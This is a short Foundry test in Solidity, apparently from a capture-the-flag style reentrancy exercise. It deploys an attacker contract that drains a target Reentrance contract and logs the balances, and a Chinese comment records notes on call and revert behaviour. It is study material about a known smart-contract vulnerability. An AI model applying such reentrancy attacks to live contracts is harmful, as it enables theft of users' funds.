// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Reentrance} from "../src/Reentrance.sol";
import {ReentranceAttack} from "../src/ReentranceAttack.sol";


/*
require抛出的异常，似乎只会抛出一层，无法层层抛出

call转账失败后，不会revert操作

0.8.0版本后，会自动检查overflow
*/

contract ReentranceTest is Test {
    function testReentrance() public {
        Reentrance reentrance = Reentrance(0x16df183A4B192059C55205c1a50f8598fbA97915);

        address player = makeAddr("player");

        vm.deal(player, 1 ether);

        vm.startPrank(player);
        ReentranceAttack hacker = new ReentranceAttack();

        console.log("reentrance balance %d, hacker balance %d", address(reentrance).balance, reentrance.balanceOf(address(hacker)));

        hacker.attack{value: 1000000000000000}(reentrance);

        console.log("reentrance balance %d, hacker balance %d", address(reentrance).balance, reentrance.balanceOf(address(hacker)));

        hacker.withdraw();
        vm.stopPrank();
    }
}